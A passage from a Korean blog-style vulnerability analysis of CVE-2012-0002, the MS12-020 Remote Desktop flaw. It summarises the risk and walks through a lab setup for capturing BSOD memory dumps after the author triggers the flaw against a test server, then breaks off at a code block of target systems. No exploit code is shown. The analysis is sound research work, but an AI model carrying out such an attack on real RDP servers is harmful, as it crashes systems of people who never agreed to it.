3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>CVE-2012-0002 취약점 요약</h2>\n<p>2012년 3월 14일 마이크로소프트는 비공개적으로 보고된 CVE-2012-0002의\n원격 데스크톱 취약점을 패치하기 위해 MS12-020 긴급 업데이트를\n진행하였다. 원격 데스크톱은 사용자들에게 빈도성이 높은 프로토콜로\nExploit 코드가 공개될 시 악용될 위험성이 매우 놓은 취약점이다. RDP\n프로토콜은 데스크톱에 가상 세션을 만들어 이를 통해 사용자가 원격으로\n컴퓨터에 있는 모든 데이터와 애플리케이션에 접근할 수 있게 한다. 공격자가\nRDP의 취약점을 이용하면서 악성 코드를 설치하거나 프로그램을 삭제하는 등\n사용자의 시스템을 완전히 제어할 수 있다. 2012년 3월까지는 서비스 거부\n공격 코드만 공개되고 원격에서 실행 가능한 공격 코드는 알려지지 않았다.</p>\n<h1 id=\"bsod-메모리-덤프\" style=\"position:relative;\"><a href=\"#bsod-%EB%A9%94%EB%AA%A8%EB%A6%AC-%EB%8D%A4%ED%94%84\" aria-label=\"bsod 메모리 덤프 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>BSOD 메모리 덤프</h1>\n<h2 id=\"bsod-메모리-덤프-환경-설정\" style=\"position:relative;\"><a href=\"#bsod-%EB%A9%94%EB%AA%A8%EB%A6%AC-%EB%8D%A4%ED%94%84-%ED%99%98%EA%B2%BD-%EC%84%A4%EC%A0%95\" aria-label=\"bsod 메모리 덤프 환경 설정 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>BSOD 메모리 덤프 환경 설정</h2>\n<p><strong>1. 메모리 덤프 구성</strong></p>\n<p>BSOD 장애로 인한 메모리 덤프 저장을 하기 위해 설정을 진행한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 598px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7EAAAOxAGVKw4bAAACMklEQVQoz22QW2+aYBzG+Yj7Itt3aHa/ZFmWrUnrbLaLxrRrmtUzoBxeeTkJCkXwhFUQEKG0Tueh8i7OXexiz91z8cvz+/+xYok6uyi8+3T74Sz/MVMskiIQ71nxviF1YNPkFYtXLEHtylpfaveqEELFkLVed+QQDI8tlqvlcosQmjzYgCFFyEg8q0icZbQsQ03iOUIoTVP0NylC+2OdRxHmqIbXGr6E0fhhgBdvabJE10o0WYKAAFTF95zFcjMNEj9c+PNF+Lj6uUNMjTl5+wYHAEs363S7QS971xlxTLUpMrJAywLNN2o0WYqjsGP2c9f5YpUu4SxOwYao3lXI1yev3p99xQ4OfzTciQ2ossRTssBoCtQUKAByFnjDQe/0NJv5cnmeucxeXGWzOYqlxcHY82dYut8fr3EnNmQJCVKyQCsSq8gANmquM3adB56rCzzN87QosAJX11siQihJkgOcHt6AnInN1ssQHHgBUhqNq3hhFniB3Rd+XOlU1SSKJiDbLb6jN3+tt3EcH5cP8NQZ6SrX0YROmzc0Ua5X2Pz3MAzmfUs4/9y8/GZf5wb5m1azYWjyarWNo/if5bHNg5rIsRBQLEUAhuQAGYRB0DOb1zm9cDfmgEOUTZYwrTZK90nyiK3X691uhxDabNYzP5i6vutOXXfme9Hz81OKkNc31cKNjuf75TuzXlHrZb0tIYSenhIsmj9H0RL9PwejOAoHA9Me9YY9o9tgLFmwh90j/BtU7S1pPZgsXwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image18\"\n        title=\"image18\"\n        src=\"/static/a9c9687bffcad44e6d6d5eb234abf78f/0c69d/image18.png\"\n        srcset=\"/static/a9c9687bffcad44e6d6d5eb234abf78f/e9ff0/image18.png 180w,\n/static/a9c9687bffcad44e6d6d5eb234abf78f/f21e7/image18.png 360w,\n/static/a9c9687bffcad44e6d6d5eb234abf78f/0c69d/image18.png 598w\"\n        sizes=\"(max-width: 598px) 100vw, 598px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 544px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 24.444444444444443%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA00lEQVQY02XKTWuEMBgE4PywmspSqNuv4/bS0lP/rbBFY2JMFGKyxNS+mgpa3VMPUljpwzCHYdDh+W1383gd3gU4WnMV3AY4wuE+wNHL6/vD0wGH+3B3/z/ImJMxJ63N8fhBCKGUxnGcZRljjBDi3CdA9/UHtlDbtgDQNI0QgnOulBJCSCm01tZaADifl3n+WZZ5mqZxC1lrnXPGmDRNi6KQUhJC8jwvy7Kua6XU2lVVWWuHYfi+gADAe991HaVUCJEkCeecMdb3/bqvP+/9OI7L1i/7U+lbJIl2bAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image 4 1\"\n        title=\"image 4 1\"\n        src=\"/static/d5411968270e22024f0986d60ab7df63/b3e51/image-4.1.png\"\n        srcset=\"/static/d5411968270e22024f0986d60ab7df63/e9ff0/image-4.1.png 180w,\n/static/d5411968270e22024f0986d60ab7df63/f21e7/image-4.1.png 360w,\n/static/d5411968270e22024f0986d60ab7df63/b3e51/image-4.1.png 544w\"\n        sizes=\"(max-width: 544px) 100vw, 544px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>2. 메모리 덤프를 위한 디스크 할당</strong></p>\n<p>기존에 사용하던 디스크 대신 사후에 메모리 덤프 분석이 끝난 후 폐기를 할\n수 있도록 가상 하드 디스크를 추가한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 64.44444444444444%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAC9UlEQVQ4y2VT227bRhBdGOhfFXD74AD9pP5QH4rGSCIhRRMbQRwgdRFbqSVHkiVKvIhL7iyXe+GSEiWbMwWF9qU+wHlazNkzM2dYUZZUqJK2zZaapsHD4YBPT0/U7vdDnmW1sZYOh0fsELHrOuoQXbPbDeLNhpRS3Xa7xf1+T33N4+MjsfhuTIZzqpuGkiTBoijQ1zU5gOF6PK5XkwllQYAQhijWIakwcmq5HGwm91Qq1Vlrsaoq6umcIza7m5A3hnoYY1Brjb0rm+fD4Ovf9fTmltaTewzuxhhNpySDwEEYDqLlkjKedQCAEmTvtq8nNntYYl032KP/rRe1zpL1fjCdzf1o9JVmsznGcYIAQKXWVnv/pig1qaLo+o6klFgqhc5aZG3bEiIe6XrbdU2Q56ST5I9CiFYIICklqbKk3nkchk0RRm8rY8g61znnsPIeXVVhkmyOguawP5i6rg1wboso8mI6q+zl5dBznjvvK61LI7LM8lW8zWfz1H34cGHTlIxzVJaK8pRTFsaUcU4sy7JzAXDu2/alBnhVRdF7p9RA7XY/8zz/xWj9qm3blyqH19ksuCiVOi+77ifTNN9X1v7ARX56+/7j6Zdfh6frxcMpEwCUJxuqAeiw31NHRH08tk3z+4bzVkhJxjqqt9vj22PX0a6uf/S7HdOFYlzkbHR5xW5+e8vCxYKx5WqN64cFptMpJlF0HHC/MUjTQXQ39mKxJAiCrgyjTkdxJ+ZzKtP0RRkETAN8JwBOvl3fnEzeXZ2EQXDCJje3+OXPa5zef8PlYolhGGKapiSzbGhyUVuQ5KBACxJ1LlBzThrgzAjBtBAn7P94uP6LJlefKBiN+lwhCIEAkqT3b4z3vt+scRZ7WuewNIZAFmdCSlYo9VxQFgWBlP8RTdNg2Lf5+fOF32wa5z31+fr3Io7u1+vwbD5/YHGcPBfs56W1PuaMRxEmFx8xG9+TmEzeiSBocgDinONqvsD59S2GqxUlPD1LeMriOH4m+A+hZ2EwIHbVVQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image19\"\n        title=\"image19\"\n        src=\"/static/63669029ee12f6255b1201df09d7b599/d8f62/image19.png\"\n        srcset=\"/static/63669029ee12f6255b1201df09d7b599/e9ff0/image19.png 180w,\n/static/63669029ee12f6255b1201df09d7b599/f21e7/image19.png 360w,\n/static/63669029ee12f6255b1201df09d7b599/d8f62/image19.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 547px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 48.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABQElEQVQoz33RW0+DMBgGYP6VE+chOg8x0Tt36U8eyZYFMlpogcq5pVsppYCasUuHT97bN3nzfcbb+3JmLubXz+b8cWYuxjxcmouL2f3t3evH8vNq/jS/eTkboyjKsqQIIdd1LctarSyMMSFfGAcQerudm2aZlI0Q9d8YdS2krLMswxhDCBFClFLOedM036NhGPq+OxuDc77f7wkhvu8DAFzXjeOYMSalHIZBa62Uaiccy4fD4VTebDYAgCRJsixDCPm+XxRF27ZqglFVFeccIQQA2G63tm2XZckYO40XQqhpRj0KwzCKoiAICCFxHHuelyRJ27Za636aIaXUWqdpSghxHAchJISglOZ5Tintuu5n2nE2YywMQ8/zIISO40RRVFXV6VRN08hphhBCShkEAYTQtu31ep3nuVJq/FA//OsXjZYLG1io1dEAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image 4 1 2\"\n        title=\"image 4 1 2\"\n        src=\"/static/565e1e0ee1cf13fbdcf65aeffba4dc7b/977f7/image-4.1.2.png\"\n        srcset=\"/static/565e1e0ee1cf13fbdcf65aeffba4dc7b/e9ff0/image-4.1.2.png 180w,\n/static/565e1e0ee1cf13fbdcf65aeffba4dc7b/f21e7/image-4.1.2.png 360w,\n/static/565e1e0ee1cf13fbdcf65aeffba4dc7b/977f7/image-4.1.2.png 547w\"\n        sizes=\"(max-width: 547px) 100vw, 547px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>3. 디스크 구성</strong></p>\n<p>가상 디스크를 할당한후 운영체제 환경에 디스크를 할당한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 53.333333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAA7EAAAOxAGVKw4bAAADD0lEQVQoz2WSPWwbZRzGX8PEwIrEZHYYMnRORNkqJD4nhCJBkRBj1QxdGAFB6AIiQNTaTZOKKk2gzZd7aeyzz3f33p3v673znS9xHNM29tlJbCfko019lwe5a57pmX7Po///IRe+voYfUvPICiZEPYj9ehvt3rEnKq5ckBgUsxrp7r9w1rejeniAJ62eXFQcLy87kPT12PAeg21so9bood7YASHvf4qbGQ6nhwfo7O3Gz0+OAcCr+obsmBICtxRVKyaqFSParJgIyrq86Wqer+Thq4W46mqoMRWbvgnf0UDIh6PxDC/FAOIX/Sg6GxjANQxJLPIcdLXQN4RczIq5vmNRWLYimlrRpWvLEFeXopLMxzYtxI4px4YmxIR8/BXuiPqgFV7CzoBnYasW0Lzl2grKtgLXpCjbKsoWhbbywKoo+ZrDFAwCXIuizFR4TIWtiyBjN9Jh0SyFB51mGG6tNxuB23kqC1KVz3Auoz2fKY2yTUMmrjVYgetZC3OrAf/QdJh6VLZoh5m0a+S5riU86mo03yUrs9mR67/Mjlz7aWbkux+nhn/9ff7ddF6/8NeiNLS6JF/87cbC8PcT8yM/X58ankzdvzgtGkPqlvMmK4lvMUNKqqqQXEtNJgsz6SSfyySJalbCSq0RBlvN8Gl7v7mzf9Jt7/UK7135dumdy1f2/7iXaRh2EJpebftJe/9gt3e0DIBQfpk4hkQ0TSDZ9CQp3LlF+FyGEEbzsOUcXE2AZ9GXt6g4pY03Pv9CI5c+wXRmFd1WiG63g2cnxzg+OtTHx8dfRdRNrPvsFaMkJop/303QhbmEKDxKEMotxgq3EAdrXFyXi5GrFmDbivvaZ5cl8tEoJuYe9Dc8L/7v8LB/evoce7s78sSf04nb03dJs9kg56TnOdDMfZSFLOquGfuDT/Kc//roNwr54EvcE7UIL07RPzuLBktot9o0fWsisbI4R1qt1nkg0yXYWhFGqQiVfxhr2RWwf2Y3plIpY+zmFDRmx3vtbdTLLHrsOahUXHrp7aHE1atjxNTVc8D/AYGhe/WlD7MGAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image20\"\n        title=\"image20\"\n        src=\"/static/cedba1779661dda16537c68730284b83/32056/image20.png\"\n        srcset=\"/static/cedba1779661dda16537c68730284b83/e9ff0/image20.png 180w,\n/static/cedba1779661dda16537c68730284b83/f21e7/image20.png 360w,\n/static/cedba1779661dda16537c68730284b83/32056/image20.png 602w\"\n        sizes=\"(max-width: 602px) 100vw, 602px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 546px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 48.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABK0lEQVQoz43QQU/CMBgG4P41sznRRJmiFw+ejEf/KOGCGOpgjDUD2jHXjkL7FbbVCIleYPrkvX55836o8/DkuO1zz3fc9plz7Xp+6+r+4rLjer5/+/j88uq17o7GcW9QkiSUsn7/bTB47/V6GH8wxiilnPPPvfwYznkcEySlVEqNx+PZbJYkyWKxEEJIKa21ZVlWJ9R1LYRAnPOiKEajURAEw+FwOp0yxubzuVIKTjPGLJfL72YAIHuTyYRSCgCbzaah9rdZCJHneRiGURRhjMMwLIpCa60aaa0ZY0hrDQBxHFNKGWNZlhFCjDH2L6vVCq3Xa2NMEASEkHhPCFHX9b+OlVJSyp/NaZpaa3e7XdmoqirOOcqy7PBtjHG3242iaLvdHlY1AIA0Tb8AS48QmgE1xt8AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image 4 1 3\"\n        title=\"image 4 1 3\"\n        src=\"/static/b1f0104bbc47d9bd848a075f74c5b6c7/76aed/image-4.1.3.png\"\n        srcset=\"/static/b1f0104bbc47d9bd848a075f74c5b6c7/e9ff0/image-4.1.3.png 180w,\n/static/b1f0104bbc47d9bd848a075f74c5b6c7/f21e7/image-4.1.3.png 360w,\n/static/b1f0104bbc47d9bd848a075f74c5b6c7/76aed/image-4.1.3.png 546w\"\n        sizes=\"(max-width: 546px) 100vw, 546px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>4. BlueScreenView 설치</p>\n<p>BSOD 장애가 발생할 환경에서 BSOD 덤프정보를 확인할 수 있는 프로그램 설치</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 600px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 66.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAA7EAAAOxAGVKw4bAAADeElEQVQ4y3WR3WsjZRTGX4io4M2CLHi36r2sIPhPiP+A7CJavNF10XrhdgVRXHFhi25BVLYtajsW624/rG2apE2bZCbp5HNmkmkySdqmaZppMtOkadKmzUze95GJglce+PGcc+AcHs4h60oNYr6FpNZCVG0gojQRVo4hSCZ4ybQdDUm1yWhMKGuyiLQYYAnehyTvRTq6CSURgpYWLUeVRGiUuFNdbEQN+Dd2sOY/xIpnHx5fBQHeQFCo25t8HSm5PXls6uWDyiFsy2KVfAal7QzqlTJMowajfmTtFPPIZdVRMhdqUblg0KahU7Neo6ah01azQXO5bcqHwz01q+JQP5honTZL+tERej2rzyyLMsumYKDAgEv8Ew/I0mYbSbWDevkUnc6ZMwDLtlHQ0gisLUPc8ECKC9On5+eGaZr4/2Dods/HyHLwmBNjbe5Q63Dt9gnXOmly7dMWJyXj3Nrq8lQk5JtLRfn3Ikp5TJSKs+Vqazq/Z3IVo8MdGmecbp5z9cbFr/rx2aK2e/QW2cnK8p6myka9KheLRVnNZORKZV+u1XT5oFxONhvGjn6kf/Fw9KfVh19/n/3m3g/S2IMJefzHKfnRoxl5/JfH8uTUXOLn3xZK07N/DRO/L4alRQFur4Qn7iQW5tex8McyZn/3YNGTgN3vo9u9nF738YYU20I6KSIeFsD7NpAIxxAVU5BSKqJbSaiK9h2xLJv2KaUAGxy4qG3TpcczNJ2KU0r7PQYGu9ef8K8GS17vOvxrm333io8GAjwNBQUaDIRomI/0w0IEwkagSgDYDpTSgVYrJTvoX7HzWcVmjP37PTYeD8f20+kMMorMRDGKtKIgl81CliVouaxTMyUeB2GMYYBjEkClvIctfg3FfGbQd8ybhjGTy2T1nnWBi26bNRoGLKsLxix0u23YVpddXHbQrFWp43CIMTZEKR1y8t2iNuRzzw/tFbNO/92eZX9wdmK8lhJzc2KkgIiQ70eEPCLhPLbCefAhDXxQQzCYQ8AnDxwOoHSwnJR2C8Tnnie7BXVQO7x58wl54eq9+1eu3sczz31lPfXslyDkcxDyGQi5C0JG/lMALsaYi1LqcvL9vaLL7/3TtVtQXf1LyzUzuvr0G8/fJp++fvfbW9dHcOv6HevDV0fw/it38PbLn+DGtY9x88Vh3Lg2jHde+gh/A5uZS2EXS8U3AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image21\"\n        title=\"image21\"\n        src=\"/static/1b408504f5c7864ab444c3a8f930d978/0a47e/image21.png\"\n        srcset=\"/static/1b408504f5c7864ab444c3a8f930d978/e9ff0/image21.png 180w,\n/static/1b408504f5c7864ab444c3a8f930d978/f21e7/image21.png 360w,\n/static/1b408504f5c7864ab444c3a8f930d978/0a47e/image21.png 600w\"\n        sizes=\"(max-width: 600px) 100vw, 600px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 547px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 36.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA/UlEQVQY043N3U6DMAAF4L6fyoCpA3RmJhKv9q5LyFYgkKWAKb8FWls6JMwEonEXRr+cy3NygG1vnzavy7u1plva8kHTLVUzVd1SVENZGC/29nFtX13f3iirhWbeG5uV+fwdIITo+34YhqIo8jzPJnmelWWBMU6SpK5rIQRjTEo5juP5BxDH8TyAEO73e8dxIIRZlhFCMMZpmhJC3ieMsfYSQAjNh4fDAULouq7neVEU+b5/PB6DIGjbllI6t+kl0DQN55xSmiRJGIaMsdPpxDmXUvZ9L6X8+B2o67rrOiHE2xff9xFC538AGGNCSFmWcLLb7RBCVVUJIfhfPgFbsmVSc6QrLQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image 4 1 4\"\n        title=\"image 4 1 4\"\n        src=\"/static/78528d128c548111bde3239c2ef2b5a4/977f7/image-4.1.4.png\"\n        srcset=\"/static/78528d128c548111bde3239c2ef2b5a4/e9ff0/image-4.1.4.png 180w,\n/static/78528d128c548111bde3239c2ef2b5a4/f21e7/image-4.1.4.png 360w,\n/static/78528d128c548111bde3239c2ef2b5a4/977f7/image-4.1.4.png 547w\"\n        sizes=\"(max-width: 547px) 100vw, 547px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>BSOD 메모리 덤프 분석을 하기위한 환경 설정 과정을 마쳤다. 5.7.2 Windbg\n동적 분석 장에서 분석하기 위해 사용될 것이기 때문에 환경 구성 한다. 현재\n과정에서 CVE-2012-0002 취약점을 통한 공격을 수행한후 대상 서버에서 BSOD\n장애가 발생하면 해당 메모리 덤프가 저장되어 분석을 할 수 있다.</p>\n<h1 id=\"cve-2012-0002-분석\" style=\"position:relative;\"><a href=\"#cve-2012-0002-%EB%B6%84%EC%84%9D\" aria-label=\"cve 2012 0002 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>CVE-2012-0002 분석</h1>\n<h2 id=\"cve-2012-0002-취약점-개요\" style=\"position:relative;\"><a href=\"#cve-2012-0002-%EC%B7%A8%EC%95%BD%EC%A0%90-%EA%B0%9C%EC%9A%94\" aria-label=\"cve 2012 0002 취약점 개요 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>CVE-2012-0002 취약점 개요</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 545px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 20.555555555555554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA+0lEQVQI1x3OS0rDQBgA4FxGBEFqbS0uUqubtrpQ7EaL1AZfVPAIuvEyunChC6EgBS+QTXYZmJnMpDSPSRpSTJwxgV/a7wSfVqnq7c5pbWd/aIwiITjnrutSQhBCnHPGmGmalmVhjBljlFLHcRhjnHPf97VKVW+2juqNg0tjBABSSvW3VBSFUkoIgTEmhCwWaVmWSqliRa1o9Ubr7NzoHPYGw7s8y6L5PPa8GOMojrPsZzz+ur59eHx6vhjcTCbfeZ4TQhFCQRAkSaJtbTePT/r6Xte4ugeAXym92SyYTsMwBID3j8+Nzd12t7e2Xnt5fQMASqlt22m6jPwDZouw7C0u+5oAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image 5 1\"\n        title=\"image 5 1\"\n        src=\"/static/e490a63b7d51a6c296da3986913c33a6/3ddad/image-5.1.png\"\n        srcset=\"/static/e490a63b7d51a6c296da3986913c33a6/e9ff0/image-5.1.png 180w,\n/static/e490a63b7d51a6c296da3986913c33a6/f21e7/image-5.1.png 360w,\n/static/e490a63b7d51a6c296da3986913c33a6/3ddad/image-5.1.png 545w\"\n        sizes=\"(max-width: 545px) 100vw, 545px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"cve-2012-0002-대상-시스템-목록\" style=\"position:relative;\"><a href=\"#cve-2012-0002-%EB%8C%80%EC%83%81-%EC%8B%9C%EC%8A%A4%ED%85%9C-%EB%AA%A9%EB%A1%9D\" aria-label=\"cve 2012 0002 대상 시스템 목록 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>CVE-2012-0002 대상 시스템 목록</h2>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token 